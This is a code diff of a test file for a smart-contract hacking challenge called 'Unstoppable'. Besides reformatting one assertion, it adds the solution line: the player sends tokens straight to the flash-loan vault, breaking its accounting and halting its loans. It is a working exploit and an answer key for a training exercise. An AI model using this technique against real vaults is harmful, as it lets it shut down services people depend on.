@@ -29,9 +29,7 @@ describe('[Challenge] Unstoppable', function () {
         expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
         expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
         expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
-        expect(
-            await vault.flashFee(token.address, TOKENS_IN_VAULT)
-        ).to.eq(50000n * 10n ** 18n);
+        expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(50000n * 10n ** 18n);
 
         await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
         expect(await token.balanceOf(player.address)).to.eq(INITIAL_PLAYER_TOKEN_BALANCE);
@@ -45,6 +43,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
     });
 
     after(async function () {
